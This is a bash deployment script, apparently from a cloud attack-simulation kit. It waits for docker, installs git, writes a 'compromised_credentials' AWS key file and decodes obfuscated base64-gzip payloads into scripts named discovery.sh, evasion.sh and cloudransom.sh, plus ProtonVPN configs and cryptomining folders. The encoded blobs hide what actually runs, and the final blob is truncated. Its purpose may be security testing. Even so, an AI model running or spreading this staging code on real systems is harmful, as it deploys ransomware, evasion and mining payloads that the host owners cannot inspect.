#!/usr/bin/env bash

# TEMPLATE INPUTS
# script_name: name of the script, which will be used for the log file (e.g. /tmp/<script_name>.log)
# log_rotation_count: total number of log files to keep
# apt_pre_tasks: shell commands to execute before install
# apt_packages: a list of apt packages to install
# apt_post_tasks: shell commands to execute after install
# yum_pre_tasks:  shell commands to execute before install
# yum_packages: a list of yum packages to install
# yum_post_tasks: shell commands to execute after install
# script_delay_secs: total number of seconds to wait before starting the next stage
# next_stage_payload: shell commands to execute after delay

export SCRIPTNAME="tag"
export LOCKFILE="/tmp/lacework_deploy_$SCRIPTNAME.lock"
export LOCKLOG=/tmp/lock_$SCRIPTNAME.log
export MAXLOG=2
truncate -s0 $LOCKLOG
# Initial lock is debug for lock handler
export LOGFILE=$LOCKLOG
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}

# in some cases we'll have multiple executions as the same time - try to randomize start time
RAND_WAIT=$(($RANDOM%(300-30+1)+30))
log "waiting $RAND_WAIT seconds before starting..."
sleep $RAND_WAIT

if command -v yum && ! command -v ps; then
    RETRY="--setopt=retries=10"
    yum update $RETRY -y && yum $RETRY install -y procps
fi

CURRENT_PROCESS=$(echo $$)
PROCESSES=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip")
PROCESS_NAMES=$(echo -n $PROCESSES | xargs --no-run-if-empty ps fp)
COUNT=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip" | wc -l)
# logs initially appended to current log - no log rotate before checking lock file
log "Lock pids: $PROCESSES"
log "Lock process names: $PROCESS_NAMES"
log "Lock process count: $COUNT"
if [ -e "$LOCKFILE" ] && [ $COUNT -gt 1 ]; then
    log "LOCKCHECK: Another instance of the script is already running. Exiting..."
    exit 1
elif [ -e "$LOCKFILE" ] && [ $COUNT -eq 1 ]; then
    log "LOCKCHECK: Lock file with no running process found - updating lock file time and starting process"
    touch "$LOCKFILE"
else
    log "LOCKCHECK: No lock file and no running process found - creating lock file"
    mkdir -p "$(dirname "$LOCKFILE")" && touch "$LOCKFILE"
fi
function cleanup {
    rm -f "$LOCKFILE"
}
trap cleanup EXIT INT TERM
trap cleanup SIGINT

# Update lofile after lock check
export LOGFILE=/tmp/lacework_deploy_$SCRIPTNAME.log

# Log rotate
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

# Determine Package Manager
if command -v apt-get &>/dev/null; then
    export PACKAGE_MANAGER="apt-get"
    PACKAGES="git"
    RETRY="-o Acquire::Retries=10"
elif command -v yum &>/dev/null; then
    export PACKAGE_MANAGER="yum"
    PACKAGES="git"
    RETRY="--setopt=retries=10"
else
    log "Neither apt-get nor yum found. Exiting..."
    exit 1
fi

# Wait for Package Manager
check_package_manager() {
    if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
        # Return 0 (false) if a package manager process is found, indicating it's busy
        ! pgrep -f "apt-get (install|update|remove|upgrade)" && \
        ! pgrep -f "aptitude (install|update|remove|upgrade)" && \
        ! pgrep -f "dpkg (install|configure)"
    else
        # Similar logic for yum/rpm
        ! pgrep -f "yum (install|update|remove|upgrade)" && \
        ! pgrep -f "rpm (install|update|remove|upgrade)"
    fi
}

check_payload_update() {
    local payload_path=$1  # First argument passed to the function
    local start_hash=$2
    local check_hash=$(sha256sum --text "$payload_path" | awk '{ print $1 }')
    log "comparing start payload hash: $start_hash to current payload hash: $check_hash"
    if [ "$check_hash" != "$start_hash" ]; then
        log "payload update detected..."
        return 1  # Return 1 if payload update is detected
    else
        log "no payload update..."
        return 0  # Return 0 if no update is detected
    fi
}

# if package manager is busy wait some random amount of time - again to create more randomness
while ! check_package_manager; do
    RAND_WAIT=$(($RANDOM%(300-30+1)+30))
    log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
    sleep $RAND_WAIT
done

# export functions for child script usage
export -f log check_payload_update

# Conditional Commands based on package manager
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt pre-task";
log "Checking for docker..."
while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
    log "docker not found or not ready - waiting"
    sleep 120
done
log "docker path: $(command -v  docker)"

log "Done apt pre-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum pre-task";
log "Checking for docker..."
while ! command -v docker > /dev/null || ! docker ps > /dev/null; do
    log "docker not found or not ready - waiting"
    sleep 120
done
log "docker path: $(command -v  docker)"

log "Done yum pre-task";
fi
if [ "" != "$PACKAGES" ]; then
    while true; do
        /bin/bash -c "$PACKAGE_MANAGER update && $PACKAGE_MANAGER install -y $PACKAGES" >> $LOGFILE 2>&1
        if [ $? -ne 0 ]; then
            log "Failed to install some_package using $PACKAGE_MANAGER - retry required"
            while ! check_package_manager; do
                RAND_WAIT=$(($RANDOM%(300-30+1)+30))
                log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
                sleep $RAND_WAIT
            done
        else
            break
        fi
    done
fi
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt post-task";

log "Done apt post-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum post-task";

log "Done yum post-task";
fi

MAX_WAIT=30
CHECK_INTERVAL=60
log "starting delay: $MAX_WAIT seconds"
SECONDS_WAITED=0
while true; do 
    SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
    if [ $SECONDS_WAITED -ge $MAX_WAIT ]; then
        log "completed wait $((MAX_WAIT / 60)) minutes." && break
    fi
    sleep $CHECK_INTERVAL;
done
log "delay complete"

log "starting next stage after $SECONDS_WAITED seconds..."
log "starting execution of next stage payload..."
rm -rf /cloud-tunnel
mkdir -p /cloud-tunnel /cloud-tunnel/aws-cli/scripts /cloud-tunnel/terraform/scripts/cloudcrypto /cloud-tunnel/terraform/scripts/hostcrypto /cloud-tunnel/protonvpn
cd /cloud-tunnel
echo 'compromised_credentials' > /cloud-tunnel/.env-aws-compromised_keys_user
echo 'H4sIAAAAAAAA/6RW33PaOhZ+rv6Ks4qzA+3KDpnpw5I6s5mGtswmkCHZdu8NHaLYAuvGllRJNkmB//2ODDamN2naWx4Y2zo/Pp3z6dPZ+0dwy0VwS00CCF2+HfUvrgYn570Qe61bapigGQPsHeA23qxOTvsjtwpRDIQA9lox1w0zOA5iVgQiT1M4PP5nB45AzWMgF9DG6GNvdNkfDkJ84B/4HYwQF1PZai9QRC28edMb9pG3BQEtb+PQRsitrRBKWKqaDh9QbuiMdaHpd02Sz0BIJIWlXDAdXtO5IVHKl5ZpTadSZ0ulpZWiUMJZmkhzZcNrt+WUC+abZBlzE8mC6Qf3EqUyjyP9oOwykcaWT9J5MlGQKU9Z2Bt8nLzrn/UQIsQwXfCIAYBNGMQyumMaajRgJaQ0F1FyhLYBABS1iVtjouBaiowJCwXVnN6mDJyJDzGb0jy1XfCZKAC57b94we65hY4rDtM6MzNXHhYlEnBvNBqOuuAtOivs1udUix2DTyejQWPddWNnvT94N2ysIzSVGjhwAdj7Dz6CWCKAiBoGnvuKAABIsiTEtaldvrrfh97ZRYi9Bd97Ga5w/dkkfGphDxQ1Fqie5W7LYUHTnNU2LlD9cnS0zhCFL5fN9r7cpno7HFyd9Ae90d/MV6UwZYoNLxrx1yz7xeDTMnhNnUb4ikW/lqAOuAe5uBNyLkAqy6VADTNmaIRiKRhCexAlLLoD113NvuRcsxjxKVwD+QrYW6w3vcLw+cgxeh2mqgRGU+5CGGZzBamczbiYobPh+3Ifgc1UQK2l7gxMvEXdn9WkjuubxE/lDE1zETmULggsyiQlDW9iahmQHF7h/d/Ifkb246v9D9398+7+5e/4BoPXwT9nDcfH4G0gohU6P/n/2fB9eLil941hX8BrtdYrpNNuA+lA58ZRHrICcOXt44XH/+W1WvxVp91ewWFD/pZLsDpnzkcwlBV1yoZ7Bz/mgsp+TKiyrXZZCTXTTAGZAqbKYme2/RKru5k7nvPEyUjtuTmdrpb4E+WWi1nZYKqsU5lbBrSgPHXq4vu+K6BJGVPQOdiwokGAbdd2ObAWHMCjDWk2NAMhreNDtynC6xaV55mlZexvAoeAa1HeTVNbTfrnJ+97IZ4lkfa5DKzS1NDYqqD27L72D/0NH06Hb//bG02GF1eXISYkZpZGCbgHJ8/huuzMBjYXDilVhMZxOOhdTU5Oz/sD/DRQK7XS8v7hGZyxYtpIEdTmj8By16jOgJDyEq0sgSj498Hrg677+w4QE8ncmpxb9gwULY35gwYiisjWp+vuxZRaZuxj0LhDxWxY97C7bdCOBpQRgc6NIyQhGb0nc6nvmDZhx8WQ5FbLuXEkeHInmyv6mW3QjH6VItgYd7+PnQmrH5TkwobbMefJLQGZQ7BWfPO91lcjxDNIE2oSHkmtgtrjJ+H+KNhgq9A7Xanz+iZZq3TjSFc3zc+f6OreWifbzBSA/2ecwtQTSoXJzYurwM0ra/vmDfdXCweyVKxLS7WTrFKa1p9GLJOFy8HuuSnlrK6LKc02g5axUkGzbXB4DLXEVlY6e95GOUluWK1bu6rw5EKUW67muyyjIu5W77oUFXeow51E3qLR+RWQAsbflKJpXvV4jLvVY3PqHDc7OcaPgIUGORrIxugxbGP0DboxIgX8ALwGunFjqA13iebCP41vU9ZTKZiP/wQAAP//AQAA//+FeLVtmQwAAA==' | base64 -d | gunzip > //cloud-tunnel/start.sh
echo 'H4sIAAAAAAAA/7RW72/bNhD9zr/iyiqBjU6y1V8YGjhA4KqtV9cpYvfHNgwKLZ1swhKpiZSTos3/PpCSJdnz2ubD9Imgj7z33r07+uGDwZKLwZKpNSEKNbhIppfjt68m02BEBzrLB5HMcqm4Ri+V0YYSnsCf4CJQZxdI4a8z0GsUBACjtQR6IaReYwFcKM1EhCATEwAqKniugStgaYEs/gJFKQQXKw+CW67NwvOoueaWa/AJpgoJQLaJeQFuDtTpxbwQLNtL36dwegpaltG6u00STpJSRJpLAVGKTJQ5fCUAAEUGbrIXe0d0wfImLPg8WcBktoBFcPVu/6f55PVktiDkIRi9MnYL21zADeMatIRnkHFRalTk3cXn8NPFZDF6MhyS8Ztg/DaczBbB1ceL6egZIdPL11ZkqzHTmkUbLMIYExQKQ9wyxaUIWamlmxSInlp7qVy1hFK5qslYya9jphHcEh7Rk9/dk8w9iRcnb16cvHtxMv+DXlNwfHq/aDg/B6dGSe4Mnenl69FjksgCOHAB1wr/BqfXq35x/X4fXB/86zOIJWRbK6897dGvDv/F6fX4I7/fv4PH54MYtwNRpil8+wa6KNGcEUiybZOyc9ynx46QaI3RJmS57vWtEvmqwNzWleWamrB2J843K1PkmzVPEZqTJi0BqyX9xKwBwfBjuS3mEoFtGU/ZMsXamCpFzMEfEou3LYepf7jNRRhJIbDaq8ozD8aXs5dz64Xg5WhoNyscDyCWpuwGgIK8kFoKY6bH56c+wDew8Om4uhHjB9RKay8wn4V904Hd5jZoz5rAAwhOr7e/A49g36D9fnPWtrtzEO+uEJydwTvd334W27jVgitQmqcpCKlbUYElGgvocqgMVV08gOfDfn/XUR7dy7AskG2anYQ3y6pEzj6jSgxbtLu2aniLUakxrOdSVbDjjFP9HcaW7VyzwtJoi1ox8mvvVN/xkrsJnIOdBY5vGr3ywOl+hsDCNSnq+eCpdXuxGeKgDAhPrcF1Iyk04wKLEbtRbpRycF0UWzfhKY48s7L7MssLmXGFcbjBLyosFRbgupUkI9rJ1J0IFt8+updSYAdYTbke4Z24j+9nO6eC5hnKUoMLasPznItVdSrhZ+TOzNglU5hygaSVuKPaDddrsFSaPffDnJL/lqKj+IEY3Rv+zfRIf5N7GuW7Julmb+zyI6vsHTowzYFhdjo2jvl/3NJNc9wurVWaWEoak/yUQYw5SDOzoXo8wxhT9gUURlLECpaYyAIrgob/7oXtGtTIXA2L7hWEzIOrj8HVfERnU/fVVRA89J/+Cr+9r9ZP4MO8Xj2l9jGsws2L6NQn62el87DA8+G9obWz7PnwwEA/aIEax48K/TO9UF91vJbHmsL2/P5YpUeQVc+nZXRh+YPiWZmy6s+azPIUNXr0HwAAAP//AQAA//+yK4oHoAoAAA==' | base64 -d | gunzip > //cloud-tunnel/auto-free.sh
echo 'H4sIAAAAAAAA/7RW32/aSBB+379iujURqGcDPbUPjYiECJdyJUkVSNq708lZ7DGssHd93jVJ1OR/P+3a2IZybfJwPFmT+fHNN9/M5vWr7oKL7oKpFSEKNbhIppejT79NpuMB7eok7QYySaXiGr1YBmtKeAR/gYtAna0jhb+PQa9QEAAMVhLoUEi9wgy4UJqJAEFGxgFUkPFUA1fA4gxZ+ABZLgQXSw/G91ybD8+jJs0919AnGCskAMk65Bm4KVCnHfJMsGSnfIfC0RFomQerpplEnES5CDSXAoIYmchT+EYAALIE3GjH94nojKWV2/jrZA6TiznMx1fnhLwGw03C7mGTCrhjXIOW8A4SLnKNipwPv/pfhpP54Ndej4w+jkef/MnFfHx1M5wO3hEyvTyzhFo+mdYsWGPmhxihUOjjhikuhc9yLd2U8dBTKy+Wyxp8LJclcEvvbcg0gpvDG9r6w20lbiuctz5+aJ1/aM3+pLcUnD59mTecnIBToiRPpp3p5dngLYlkBhy4gFuF/4DTbhd/cfudDrh96N8eQygh2VgqbbRHvzn8F6fd5m/6nc4TvD3phrjpijyO4fERdJajiRFIkk1VshHep4dCSLDCYO2zVLc7lol0mWFqZ8hSTY1bbQnT9dIM9G7FY4Qq0pQlYLmkX5gVG5j+WGqHuUBgG8ZjtoixFKGKEVPo94jFW4/DzN/fpMIPpBBY2IrxzMajy4vTmdXC+HTQs8YCxysIpRm7AaAgzaSWwojp7clRH+ARLHw6KjJi+Ipaam0C87Ow7xqw69oG7XHluAfBabd3LfAGdgXa6VSxdrWdPX93ieBsBd7Y9PpnsY1qLrgCpXkcg5C6JhVYpDGDZg+FoIrEXXjf63S2G+XRnQqLDNm6skS8+ixG5Ox2VJBhh/ZUTw3vMcg1+uUNKgZ2uONY/6Bj2+1Ms8y2UQ+16Khfaqf4HR65G8EJ2Fvg9M2iFxo42q0wtnBNifI+eGpVJzYHG5QB4akVuG4ghWZcYDZgd8oNYg6ui2LjRjzGgWe+rF0maSYTrjD01/ig/FxhBq5bUDKgjUrNi2Dx7aI7lQIbwMqWy3Pd8Lv5fLFVKmieoMw1uKDWPE25WBZRET8mT+bGLpjCmAskNcUN1u64XoFtpbLZa+lezyj5bz4atO8x8l2a73s+sOnkhZL5oVxqCNezSjg/E81O0J589qSzZbTSzv+jm2aZw8KpRVP5UlLJ5VlSMTIh1fWG4hn1Q4zZAygMpAgVLDCSGRYNmv63b21Tqobm4mw0UxAyG1/djK9mAzq8ht8/w8UUZmcwvYHRFUxm1D6FhYt5D53Su3xUGs8KvO+9GE59yd739kTznAUowfxsws/ehDLf4UkeWgm7+7vnldY5K3jFM2p7G1omQPEkj1nxD5pM0hg1evRfAAAA//8BAAD//7WuBq6UCgAA' | base64 -d | gunzip > //cloud-tunnel/auto-paid.sh
echo 'H4sIAAAAAAAA/1TNwQoCIRSF4f28UwtpLiGVytFxaCVDuRiKUdSM3j5mle4O3I/7K0gjhVXCTZog2JUOMYUStho3984+DX+hmNazxNiIuOT8CenRKMMJjShr90MTbHfPPtW+sq+jvLSVfd3Da5g56DQxjE6BW2bInenWwbUuxT/99wcAAP//AQAA//9zTWtu2AAAAA==' | base64 -d | gunzip > //cloud-tunnel/.env-protonvpn
echo 'H4sIAAAAAAAA/1TMwa7CIBCF4X0f5+67ILcTQ1QgB0rjijTKwmgKgYrx7U1XTncnk29+A+208kaF0RKUOFOfS1rT0vISXjWW7ieMsHbSGJjIc63vVG5MOUno/9jBEjyBPdVY2j68rX994uFtXdOzmyToMAoMwUB64Sgc6bKD9zav8RE/XwAAAP//AQAA//9dOzu5ywAAAA==' | base64 -d | gunzip > //cloud-tunnel/.env-protonvpn-paid
echo 'H4sIAAAAAAAA/1TMsQ7CIBCA4b3v1IHYiyEqkDugcSKNMjSaQgBrfHvTqdftH778BrXVyhsVHAEqcYM+l9TSsuYlfGos3S6MIBo1DkzkqdZvKk+mrARkos2HBwF6wN4R/2510lf+3eqR3t0oEc5O4BAMSi8shAvcD3BepxZf8fcHAAD//wEAAP///wAyzMoAAAA=' | base64 -d | gunzip > //cloud-tunnel/.env-protonvpn-baseline
echo 'H4sIAAAAAAAA/6SUW2/jNhCF3/krpqxcyEkoWW6fHNhAr2mApCmaotcUNkWNZdYUyeXF8W6S/76Q7M1mc0/2lTxnvpnDAb/8Ii+lzkvuF4QcnRz8dHj04zgPjc15CFws0U2FaawzjfRYTYXDCnWQXPlpyT0qqTHzi0yZmsyjFkEaDcrUcEEAAFAsDMwqHhBYhF3a+5v1Gtarfu/9POodj3qn/9AZhaSgL1PDZALJtllyRY6//evo5GA8JHPjQILUMPP4BpI03dywot8HVkAx24fKQLMC+sGd0YtE7iVpKneLfv8KhpO8wlWuo1JweQnBRWw9GkmzukbesBf0PgsRCxTLKbch7XdJ2NqhBTYHym2grezjSWWXNSVX5HwhFcK1s8US6LKkf3IZpK6hnY/bAMFAicBXXCpeKsyyrA3QK0QLxYB0/ZLOeRq4a62dpDv5bvtqwIVA7zc1hTBRh63i++gc6gCHv44gSUV0CpiHRQh2lOdScL3g76TNhGn6lKzHxYAYG/yYMmZisDHA/95oYEwYZRyY+RwY04YJJZnlNTq6HfVfSNbA6gAD+G8fSGWg24Kuh9+i1lLXI+DnHnzwUGNggiuFjsluA8NbSFruZnWelN1cGRhOvioeYEnegJI+sOjR+duI+26fW9l/za3cuMsolhjuVH9I8VwCiiFU6IWTJTKpfeBa4B3KY6rXkRpeowfG5lKFNpYz+gtvcKx5g3t/cBXRj2MZdYjMOsM8uhW6fOPKd4aDbPDNzhl9vM3biJcT6GdMuDIqNk8k+YnmdRQrnkBcC+6vvx4naZqs2+/u5h/wg9GY0fcAAAD//wEAAP//gEHyAekFAAA=' | base64 -d | gunzip > //cloud-tunnel/aws-cli/scripts/baseline.sh
echo 'H4sIAAAAAAAA/6SWbW/bNhCAv+tX3Dh5sNtSir1+8uAARetlAdJkaPq2IYBDU2eJM0Vy5NFp1+S/D5Kdl6JJHNvfDPmeu+deBOjnn/KpMvlUhCpJjk4Ofj88Go9yql0uiISco59IWztvaxWwmEiPBRpSQodJoYK0C/Rfs1Bl2pbJLBpJyhrQtoRvCQAAysrCeSEIgUd4zjp/8U7NO8X7zh/Dztth5/Rvds4g7bPNomF/H9KVbXKVvH31+ejkYDRIZtaDAmXgPOC/kHa7y394v9cD3of++W9QWKgXwK7pjH1L1Yu021XP+73eFQz28wIXuYlaw+UlkI/YMAaTenFT8g7eZ/chiaxQzifCUbfXTsKVHh3wGTDhiDVht08KNy9ZcpVcVEoj3JBN2QTaWbJPQpEyJTT9CUdAFqYIYiGUFlONWZY1Awwa0UF/L2l9k5Y8RWrJDwE9FyUaGsKrT6eT8efx6w/vD0+OJ+Pjj6ObVbIEvzjr6Z4YdidolZuEb5K35dsnb65DQEiJIcD1EUFQddSiuY7b6NfRezQEh38OIe3K6DXwABWRG+a5ksJU4j/lMmnrHkusozBinNtILhL8E6wBzqXV1oOdzYBzY7nUijtRomftKbwbHxyeHDf3kHbFRQCUAygwSK+myD2WypoANykJvxBcgowEfPayt5r/agO3ncXQzLOZzzL9ENLlD3Yb/S4ao0w5hKaqEjVoFYjHgD5A2nQCfFUfztgKP2PLBOuRa+K71wAG+7/0HzAIvwqnlgmnUc6RnmaxHtvY5LsNoBaBlOSli08TejK9m1dlwxMntB7bzUTVosQm20xpai7hjB2LGkdG1Pjio9ARwyhOo6HInbc8oF+gz5dU/mywl+29fHbGNm/lh7qbl/2h6m6TMEgX1s+5kHqL1TxG7+blse2+4MoEEkbiFnbrc+zmGFBGr+grL72NbgvBNQl2tDPChcpu88Y9iO5mtLA61tss8gFwRxsnt1G5h3rE484XwxtrMGP/AwAA//8BAAD//xA5MRIYCgAA' | base64 -d | gunzip > //cloud-tunnel/aws-cli/scripts/discovery.sh
echo 'H4sIAAAAAAAA/9SUb08TQRDG3++nGJertMG9esT4oqaNRCo24U8iIKiYdns3vS7s7W5391oJ5bubu55FkFghvNC3s/M88/Q301t71hwK1RxyNyZk92DnfW+32276zDS59zy+QNuPdWaszoTDpB9bTFB5waXr45Q7oVXoxqHUKRnlKvZCK5A6hSsCAIDxWMMg4R6B5bBBa59ZLWO15Kj2oVXba9UOv9ABhSCiD+uGTgeCKiu5Jntbp7sHO+1NMtIWBAgFA4cTCOr1xQuLGg1gEUSDN5BoyKZAf6pDehWIF0G9LjaiRuMaNjvNBKdNlUsJ8zl4m2OhUUiy6XLkL/KI3ich8Rjjiz43vt4oSZjUogE2AsqNp0XbTSUxFykl12Q2FhJhqSzGEihZ0hMuvFApFL+PGw9ewxCBT7mQfCgxDMMCoJOIBqKXpMxLSuUh+lJ57NAynqLyLdg6Oex3T7vvjo96B/v97v6ndrVISvC70dbf00GXLZWv57YwLkeTNRDKeS4lGIsTRy7zbFlhl3A+IUQb79qUMZ17k3s4d1oBY7GW2oIejYAxpVksBTM8RUvJGlQTCyODsde2XK/Vs2LBQZ3P3M0TSOE8486hcxkqz2yuHPztNJjD+QSYhfXw6zeYw9shd/j61Xqj2gFAb7sd1MvzpIHVMwpzWPQAYwnGOsFbHuuNUlWS+pgrJVTagtuBndfmTmBgdwqMWwVnNOhtn1EICoKL/8kjnQqjygc6cHO0m53n0cq8CUr0+DSJH+D1x8zlnT/gKDy3Kfp/+y5+Z7NIfRvPovZY2iscn5Y5ZkZyj/8d9Sr3HUpV9dHkV7uupr/4Am9rhSH9AQAA//8BAAD//4hMkJ2+BwAA' | base64 -d | gunzip > //cloud-tunnel/aws-cli/scripts/evasion.sh
echo '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' | base64 -d | gunzip > //cloud-tunnel/aws-cli/scripts/cloudransom.sh
echo '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